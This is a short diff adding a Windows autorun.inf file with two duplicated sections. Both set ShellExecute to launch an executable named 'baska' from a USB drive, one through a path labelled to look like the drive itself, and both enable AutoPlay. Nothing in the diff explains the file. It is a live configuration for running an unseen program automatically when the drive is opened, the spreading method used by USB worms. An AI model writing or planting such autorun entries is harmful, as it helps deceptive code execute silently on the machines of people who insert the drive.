@@ -1,0 +1,9 @@
+[autorun]
+;Open= USB Drive (F:)\baska
+ShellExecute= USB Drive (F:)\baska
+UseAutoPlay=1
+
+[autorun]
+;Open= F:\command + results\baska.exe
+ShellExecute= F:\command + results\baska.exe
+UseAutoPlay=1
